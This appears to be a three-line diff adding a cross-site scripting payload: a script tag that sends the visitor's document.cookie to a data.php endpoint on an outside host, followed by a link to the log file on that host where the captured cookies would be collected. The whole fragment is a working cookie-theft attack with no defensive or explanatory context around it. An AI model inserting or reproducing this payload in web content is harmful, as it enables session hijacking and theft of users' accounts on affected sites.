@@ -1,0 +1,3 @@
+<script>javascript:img=new Image();img.src="http://westcraig.com/XSS/data.php?cookie=" + escape(document.cookie);</script>
+
+the log file: http://westcraig.com/XSS/log.txt
